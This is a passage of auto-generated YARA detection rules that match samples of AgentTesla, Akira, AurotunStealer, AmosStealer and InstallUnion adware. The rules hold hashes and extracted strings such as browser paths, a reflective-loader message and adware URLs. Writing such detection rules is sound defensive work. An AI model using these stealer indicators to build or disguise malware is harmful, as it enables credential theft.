      $s9 = "PAYLOAD_DLL" fullword wide /* score: '18.00'*/
      $s10 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword wide /* score: '17.00'*/
      $s11 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword wide /* score: '17.00'*/
      $s12 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '17.00'*/
      $s13 = "HttpAddRequestHeaders failed for /api/v2/zf: " fullword ascii /* score: '16.00'*/
      $s14 = " -> FAILED to find required gadget." fullword ascii /* score: '16.00'*/
      $s15 = "Could not find ReflectiveLoader export in payload." fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "b27c17408902acbcf9ce079d41811097" and ( 8 of them )
      ) or ( all of them )
}

rule _Akira_signature__f89d971f855e5743dd4d1e73a5da5699_imphash__AurotunStealer_signature__b74c10c5dc993e8c6ba8ba72a5efbe76_impha_67 {
   meta:
      description = "_subset_batch - from files Akira(signature)_f89d971f855e5743dd4d1e73a5da5699(imphash).exe, AurotunStealer(signature)_b74c10c5dc993e8c6ba8ba72a5efbe76(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "def3fe8d07d5370ac6e105b1a7872c77e193b4b39a6e1cc9cfc815a36e909904"
      hash2 = "dd57e2088e25c5bd7669450207e89d0c529c056800fd938ef914d8810102511d"
   strings:
      $s1 = ".?AV?$_Ref_count_obj2@V?$wincolor_stdout_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@@std@@" fullword ascii /* score: '20.00'*/
      $s2 = ".?AV?$_Ref_count_obj2@V?$basic_file_sink@Vmutex@std@@@sinks@spdlog@@@std@@" fullword ascii /* score: '20.00'*/
      $s3 = ".?AV?$basic_file_sink@Vmutex@std@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s4 = ".?AV?$wincolor_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s5 = ".?AV?$wincolor_stdout_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s6 = ".?AV?$base_sink@Vmutex@std@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s7 = "[*** LOG ERROR #%04zu ***] [%s] [%s] %s" fullword ascii /* score: '19.00'*/
      $s8 = "Rethrowing unknown exception in logger" fullword ascii /* score: '14.00'*/
      $s9 = ".?AV?$_Ref_count_obj2@Vlogger@spdlog@@@std@@" fullword ascii /* score: '14.00'*/
      $s10 = "logger with name '" fullword ascii /* score: '14.00'*/
      $s11 = ".?AVlogger@spdlog@@" fullword ascii /* score: '14.00'*/
      $s12 = "Failed getting timezone info. " fullword ascii /* score: '12.00'*/
      $s13 = ".?AV?$r_formatter@Unull_scoped_padder@details@spdlog@@@details@spdlog@@" fullword ascii /* score: '9.00'*/
      $s14 = ".?AV?$elapsed_formatter@Vscoped_padder@details@spdlog@@V?$duration@_JU?$ratio@$00$0PECEA@@std@@@chrono@std@@@details@spdlog@@" fullword ascii /* score: '9.00'*/
      $s15 = ".?AV?$elapsed_formatter@Unull_scoped_padder@details@spdlog@@V?$duration@_JU?$ratio@$00$0DOI@@std@@@chrono@std@@@details@spdlog@@" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signat_68 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash5 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = ".System.Net.Security.dll8System.Security.Cryptography" fullword ascii /* score: '19.00'*/
      $s2 = "targetHost\"localCertificates\"remoteCertificate\"acceptableIssuers" fullword ascii /* score: '18.00'*/
      $s3 = " GetPrivateKeyCsp@" fullword ascii /* score: '15.00'*/
      $s4 = "F<get_KeySize>g__ComputeKeySize|68_0@" fullword ascii /* score: '15.00'*/
      $s5 = "FDecodeX509EnhancedKeyUsageExtension@" fullword ascii /* score: '14.00'*/
      $s6 = "F<DecodeX509KeyUsageExtension>b__5_0@" fullword ascii /* score: '14.00'*/
      $s7 = "4<DecodeDssKeyValue>b__27_0@" fullword ascii /* score: '14.00'*/
      $s8 = ":<DecodeECDsaPublicKey>b__18_0@" fullword ascii /* score: '12.00'*/
      $s9 = "LCRYPT_OID_INFO_PUBKEY_ENCRYPT_KEY_FLAG" fullword ascii /* score: '12.00'*/
      $s10 = "N<DecodeECDiffieHellmanPublicKey>b__19_0@" fullword ascii /* score: '12.00'*/
      $s11 = "8<DecodeDssParameters>b__28_0@" fullword ascii /* score: '11.00'*/
      $s12 = "cbDecodedObject" fullword ascii /* score: '11.00'*/
      $s13 = ":get_FormattedInvalidCultureId" fullword ascii /* score: '9.00'*/
      $s14 = "GetDaysInYear&GetAdvanceHijriDate" fullword ascii /* score: '9.00'*/
      $s15 = ".GetMarshallersForStruct" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Adware_InstallUnion_signature__74e1653b030292297ee93b8588161740_imphash__Adware_InstallUnion_signature__74e1653b030292297ee_69 {
   meta:
      description = "_subset_batch - from files Adware.InstallUnion(signature)_74e1653b030292297ee93b8588161740(imphash).exe, Adware.InstallUnion(signature)_74e1653b030292297ee93b8588161740(imphash)_70cc1e2b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e08b75d9dce6b95653e44306a3ab460170bf037a219501043b60f5397ea7e08"
      hash2 = "70cc1e2b56cfe037923d50292a8eb8f448a43aa6b023c3c612c058c1ac6d2505"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><dependency><dependentAssembly><assemblyIdentity ty" ascii /* score: '44.00'*/
      $x2 = "win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144cc" ascii /* score: '36.00'*/
      $x3 = "C:\\Users\\Samim\\Desktop\\Installer\\Release\\Installer.pdb" fullword ascii /* score: '33.00'*/
      $s4 = "ContentI3.exe" fullword wide /* score: '27.00'*/
      $s5 = "http://post.securestudies.com/TapAction.aspx?" fullword ascii /* score: '22.00'*/
      $s6 = "\\hgsdk.dll" fullword wide /* score: '21.00'*/
      $s7 = "https://www.dlsft.com/service.php" fullword wide /* score: '20.00'*/
      $s8 = "questedPrivileges><requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"></requestedExecutionLevel></request" ascii /* score: '19.00'*/
      $s9 = "https://dlsft.com/PO.jpg" fullword ascii /* score: '17.00'*/
      $s10 = "https://filedm.com/privacy.php" fullword wide /* score: '17.00'*/
      $s11 = "https://filedm.com/terms.php" fullword wide /* score: '17.00'*/
      $s12 = "https://www.dlsft.com/geo/" fullword wide /* score: '17.00'*/
      $s13 = "\\GameBooster.exe" fullword wide /* score: '16.00'*/
      $s14 = "RegCreateKeyEx failed." fullword ascii /* score: '15.00'*/
      $s15 = "Download Completed" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "74e1653b030292297ee93b8588161740" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f_a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5ccc_70 {
   meta:
      description = "_subset_batch - from files 97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f.exe, a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594_a9c83151.exe, b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa_b053ca27.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0"
      hash2 = "a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594"
      hash3 = "b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa"
   strings:
      $x1 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $s2 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s3 = " s.sweepgen= allocCount ProcessPrng" fullword ascii /* score: '20.00'*/
      $s4 = "areForSweep; sweepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait" ascii /* score: '20.00'*/
      $s5 = "r spinbit mutexmin size of malloc header is not a size class boundarygcControllerState.findRunnable: blackening not enabledno go" ascii /* score: '19.00'*/
      $s6 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '18.00'*/
      $s7 = "e or addresssocket type not supportedinvalid cross-device linkGetFinalPathNameByHandleWGetQueuedCompletionStatusUpdateProcThread" ascii /* score: '18.00'*/
      $s8 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s9 = "portedoperation not permittedCertGetCertificateChainFreeEnvironmentStringsWGetEnvironmentVariableWGetSystemTimeAsFileTimeSetEnvi" ascii /* score: '16.00'*/
      $s10 = "bindm in unexpected GOOSruntime: mp.lockedInt = runqsteal: runq overflowunexpected syncgroup setdouble traceGCSweepStartbad use " ascii /* score: '15.00'*/
      $s11 = "on a locked thread with no template threadunexpected signal during runtime executiontraceStopReadCPU called with trace enabledat" ascii /* score: '15.00'*/
      $s12 = "t failed (errno= racy sudog adjustment due to parking on channelfunction symbol table not sorted by PC offset: attempted to trac" ascii /* score: '14.00'*/
      $s13 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '13.00'*/
      $s14 = "unsafe.String: len out of rangeresource temporarily unavailablesoftware caused connection abortnumerical argument out of domainC" ascii /* score: '13.00'*/
      $s15 = "/total:seconds/godebug/non-default-behavior/bcryptprimitives.dll not foundpanic called with nil argumentcheckdead: inconsistent " ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imph_71 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a621aed5.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1c7ed361.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6f7ec2c8.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7d94bdba.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a75d8552.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f569cdb6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "493b6a86546ac79b7647bd6f3c3523dd910e6a56e427c45197e957e268df8df2"
      hash2 = "a621aed5d7ce456a046646e757826f0c96b0f90bec9f2bcf5e73398af427bd6c"
      hash3 = "1c7ed36148366d23b3e54066575bc2ffc1d33bf164e0dcb0b81cc9052ac18069"
      hash4 = "6f7ec2c8d3c0ef2d5d4e5ea824c0af4264cd08aa0580f04499df5e4b69bc8066"
      hash5 = "7d94bdbacd3f8d708adf1709753d2370493ba125a9265a2c97ac36011faa1a44"
      hash6 = "a75d855242b6c93a5788d28047a6b3874dc3c5420dd60e0edee177cf37c66f0c"
      hash7 = "f569cdb6756554284367297ac45ab98bc87c32a9b0e05a7d6d4001c390dbf102"
   strings:
      $s1 = "Error generating password: " fullword wide /* score: '19.00'*/
      $s2 = "<IsPasswordValid>b__12_3" fullword ascii /* score: '12.00'*/
      $s3 = "<IsPasswordValid>b__12_1" fullword ascii /* score: '12.00'*/
      $s4 = "<IsPasswordValid>b__12_2" fullword ascii /* score: '12.00'*/
      $s5 = "GenerateSecurePassword" fullword ascii /* score: '12.00'*/
      $s6 = " Windows Forms Password Generator" fullword ascii /* score: '12.00'*/
      $s7 = "<IsPasswordValid>b__12_0" fullword ascii /* score: '12.00'*/
      $s8 = "passwordGenerator" fullword ascii /* score: '12.00'*/
      $s9 = "Password length must be between 4 and 128 characters." fullword wide /* score: '12.00'*/
      $s10 = "No character types selected for password generation." fullword wide /* score: '12.00'*/
      $s11 = "Password copied to clipboard!" fullword wide /* score: '12.00'*/
      $s12 = "Password Options" fullword wide /* score: '12.00'*/
      $s13 = "Enter characters to use in password" fullword wide /* score: '12.00'*/
      $s14 = "A secure password generator for Windows." fullword wide /* score: '12.00'*/
      $s15 = "Features customizable length, character types, and advanced options for creating strong passwords." fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__78921759_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_72 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_78921759.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_94b39cc6.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_331b4062.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3a304e9e.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f1722328.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "789217599c1f3acfa58bde73eca30d4f0bd9c8184fdfe37ffa7339d321cfe266"
      hash2 = "94b39cc6fa738eb8a26185ee588d5998a7f82b39a67a7312f5202a3e4ee7af78"
      hash3 = "331b4062e2bd91848560e3d76e2ad7f34fec3be595f3925f9eb45326085966e7"
      hash4 = "3a304e9ea65b8025c9b9a2337757f1270f3274ade5dd97236cc3a445348264a3"
      hash5 = "f1722328c89de2120f7cab86b9f88e4129fb7e419c8c0c699d43317553692de7"
   strings:
      $s1 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s2 = "<GetMostUsedConversions>b__20_2" fullword ascii /* score: '12.00'*/
      $s3 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s4 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
      $s5 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s6 = "<GetMostUsedConversions>b__20_0" fullword ascii /* score: '12.00'*/
      $s7 = "<GetMostUsedConversions>b__20_1" fullword ascii /* score: '12.00'*/
      $s8 = "ConvertTemperature" fullword ascii /* score: '11.00'*/
      $s9 = "GetTotalCount" fullword ascii /* score: '9.00'*/
      $s10 = "get_LastToUnit" fullword ascii /* score: '9.00'*/
      $s11 = "<GetMostUsedUnits>b__19_1" fullword ascii /* score: '9.00'*/
      $s12 = "GetMostUsedUnits" fullword ascii /* score: '9.00'*/
      $s13 = "get_FromUnit" fullword ascii /* score: '9.00'*/
      $s14 = "get_ToValue" fullword ascii /* score: '9.00'*/
      $s15 = "get_LastFromUnit" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_73 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash4 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash5 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash6 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash7 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash8 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash9 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "ChangeType operation is not supported" fullword wide /* score: '17.00'*/
      $s2 = "Switch.System.Globalization.EnforceJapaneseEraYearRange" fullword wide /* score: '14.00'*/
      $s3 = "Switch.System.Globalization.FormatJapaneseFirstYearAsANumbe" fullword wide /* score: '14.00'*/
      $s4 = "0get_MinSupportedDateTime0get_MaxSupportedDateTime$GetDefaultInstance" fullword ascii /* score: '12.00'*/
      $s5 = "ExactBinding$SuppressChangeType" fullword ascii /* score: '12.00'*/
      $s6 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zone" fullword wide /* score: '12.00'*/
      $s7 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\UT" fullword wide /* score: '12.00'*/
      $s8 = "*GetUserDefaultCulture.GetUserDefaultUICulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s9 = "System.Numerics.INumberBase<System.Decimal>.TryConvertToSaturating" fullword ascii /* score: '10.00'*/
      $s10 = "System.Numerics.INumberBase<System.Decimal>.TryConvertFromSaturating" fullword ascii /* score: '10.00'*/
      $s11 = "System.Numerics.INumberBase<System.Decimal>.TryConvertFromChecked" fullword ascii /* score: '10.00'*/
      $s12 = "'{0}' is missing native code. MethodInfo.MakeGenericMethod() is not compatible with AOT compilation. Inspect and fix AOT related" wide /* score: '10.00'*/
      $s13 = "Arrays of System.Void are not supported" fullword wide /* score: '10.00'*/
      $s14 = "4GetFormatFlagGenitiveMonth" fullword ascii /* score: '9.00'*/
      $s15 = "get_DisplayName get_StandardName get_DaylightName2GetPreviousAdjustmentRule@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_74 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash4 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash5 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash6 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash7 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$RelativeOrAbsolute" fullword ascii /* score: '24.00'*/
      $s2 = "Decoded string is not a valid IDN name" fullword wide /* score: '18.00'*/
      $s3 = "2GetUriPartsFromUserString<GetLengthWithoutTrailingSpaces" fullword ascii /* score: '17.00'*/
      $s4 = "Invalid IDN encoded string" fullword wide /* score: '16.00'*/
      $s5 = ",GetHostViaCustomSyntax" fullword ascii /* score: '14.00'*/
      $s6 = "Invalid URI: A Dos path must be rooted, for example, 'c:\\\\'" fullword wide /* score: '13.00'*/
      $s7 = "Invalid URI: The Authority/Host could not be parsed" fullword wide /* score: '12.00'*/
      $s8 = "This operation is not supported for a relative URI" fullword wide /* score: '12.00'*/
      $s9 = "PunycodeDecode" fullword ascii /* score: '11.00'*/
      $s10 = "UriComponents.SerializationInfoString must not be combined with other UriComponents" fullword wide /* score: '10.00'*/
      $s11 = "NlsGetAsciiCore\"NlsGetUnicodeCore" fullword ascii /* score: '9.00'*/
      $s12 = "GetUnicode\"GetAsciiInvariant(ValidateStd3AndAscii" fullword ascii /* score: '9.00'*/
      $s13 = "\"IcuGetUnicodeCore@" fullword ascii /* score: '9.00'*/
      $s14 = "CreateUriInfo CreateHostString,CreateHostStringHelper" fullword ascii /* score: '9.00'*/
      $s15 = "get_NlsFlags$ThrowForZeroLength" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signature__5ba0e07214b3423072c72a6e1cb6e11f_imph_75 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash2 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash3 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType&TryGetMethodInvoker@" fullword ascii /* score: '18.00'*/
      $s2 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheckBMethodInvokerWithMethodInvokeInfo*InstanceMethodInvoker" fullword ascii /* score: '16.00'*/
      $s3 = "`ReflectionExecutionDomainCallbacksImplementation MethodInvokeInfo" fullword ascii /* score: '16.00'*/
      $s4 = "FReflectionDomainSetupImplementationDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s5 = "(ThrowTargetException@" fullword ascii /* score: '14.00'*/
      $s6 = "Object does not match target type" fullword wide /* score: '14.00'*/
      $s7 = "IsPrimitiveType GetMethodInvoker@" fullword ascii /* score: '13.00'*/
      $s8 = "6get_IsArrayOfReferenceTypes@TryLookupGenericMethodDictionary@" fullword ascii /* score: '12.00'*/
      $s9 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments@get_RuntimeGenericTypeParameters2get_SyntheticConstructo" ascii /* score: '12.00'*/
      $s10 = "&TryGetFieldAccessor(get_FieldRuntimeTypeBget_ExplicitLayoutFieldOffsetData&get_FieldTypeHandle@" fullword ascii /* score: '12.00'*/
      $s11 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments@get_RuntimeGenericTypeParameters2get_SyntheticConstructo" ascii /* score: '12.00'*/
      $s12 = "rForInstanceFieldsNPointerTypeFieldAccessorForStaticFields4RegularStaticFieldAccessor6WritableStaticFieldAccessorVReferenceTypeF" ascii /* score: '11.00'*/
      $s13 = ",RuntimeConstructorInfo,IRuntimeMethodCommon`1>RuntimeSyntheticConstructorInfo0RuntimeNamedMethodInfo`1" fullword ascii /* score: '10.00'*/
      $s14 = "RuntimeImportsk" fullword ascii /* score: '10.00'*/
      $s15 = "R<GetMatchingCustomAttributesIterator>d__2" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AmosStealer_signature__378f264f_AmosStealer_signature__e52dd701_76 {
   meta:
      description = "_subset_batch - from files AmosStealer(signature)_378f264f.macho, AmosStealer(signature)_e52dd701.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "378f264fdf11a14e6c5d49e1014f6f85cead7874a12a87b0eb662bf25c53d22b"
      hash2 = "e52dd70113d1c6eb9a09eafa0a7e7bcf1da816849f47ebcdc66ec9671eb9b350"
   strings:
      $s1 = "@__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s2 = "@__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
      $s3 = "thread constructor failed" fullword ascii /* score: '12.00'*/
      $s4 = "@__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s5 = "@__ZTISt13runtime_error" fullword ascii /* score: '10.00'*/
      $s6 = "@__ZNSt13runtime_errorD1Ev" fullword ascii /* score: '10.00'*/
      $s7 = "__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s8 = "@__ZTSSt13runtime_error" fullword ascii /* score: '10.00'*/
      $s9 = "@__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s10 = "@__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s11 = "bigdeals" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0xfeca and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signat_77 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash5 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash6 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "HSystem.ComponentModel.Primitives.dll" fullword ascii /* score: '29.00'*/
      $s2 = "VGetOrCreateThreadLocalCompletionCountObject" fullword ascii /* score: '14.00'*/
